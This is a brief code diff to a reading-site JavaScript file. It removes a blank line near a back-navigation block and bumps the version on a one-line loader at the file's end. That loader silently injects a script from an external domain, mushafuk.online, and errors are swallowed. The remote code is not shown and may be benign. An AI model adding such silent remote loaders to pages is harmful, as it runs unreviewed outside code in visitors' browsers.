@@ -113,7 +113,6 @@
     up();
   }, true);
 })();
-
 /* QM-BACK-START: "×" returns to the page this reading trail actually came from.
    Context lives in each history entry's URL fragment (#qmfrom=...), never in tab-wide storage. */
 (function () {
@@ -157,4 +156,4 @@
 })();
 /* QM-BACK-END */
 
-;try{var qs=document.createElement("script");qs.src="https://mushafuk.online/read-shelf.js?v=1";document.head.appendChild(qs);}catch(e){}
+;try{var qs=document.createElement("script");qs.src="https://mushafuk.online/read-shelf.js?v=3";document.head.appendChild(qs);}catch(e){}
